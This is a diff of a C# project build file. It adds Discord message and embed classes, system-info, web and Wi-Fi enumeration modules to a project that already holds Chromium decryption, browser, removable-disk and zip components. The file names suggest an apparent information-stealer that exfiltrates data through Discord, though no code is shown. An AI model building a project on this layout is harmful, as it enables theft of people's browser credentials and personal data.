@@ -47,6 +47,7 @@
     <Reference Include="System.IO.Compression" />
     <Reference Include="System.Numerics" />
     <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
     <Reference Include="Microsoft.CSharp" />
@@ -55,6 +56,16 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Discord\DiscordMessageManager.cs" />
+    <Compile Include="Discord\Model\AllowedMentions.cs" />
+    <Compile Include="Discord\Model\Author.cs" />
+    <Compile Include="Discord\DiscordManager.cs" />
+    <Compile Include="Discord\Model\DiscordMessage.cs" />
+    <Compile Include="Discord\Model\Embed.cs" />
+    <Compile Include="Discord\Model\Field.cs" />
+    <Compile Include="Discord\Model\Footer.cs" />
+    <Compile Include="Discord\Model\Image.cs" />
+    <Compile Include="Discord\Model\Thumbnail.cs" />
     <Compile Include="Encryption\ChromiumDecryption.cs" />
     <Compile Include="Browser\BrowserManager.cs" />
     <Compile Include="Browser\BrowserModel.cs" />
@@ -86,7 +97,10 @@
     <Compile Include="Util\JsonUtil.cs" />
     <Compile Include="Util\ProcessUtil.cs" />
     <Compile Include="Util\RemovableDisks.cs" />
+    <Compile Include="Util\SystemInfo.cs" />
+    <Compile Include="Util\Web.cs" />
     <Compile Include="Util\Zip.cs" />
+    <Compile Include="Wifi\Enumerate.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
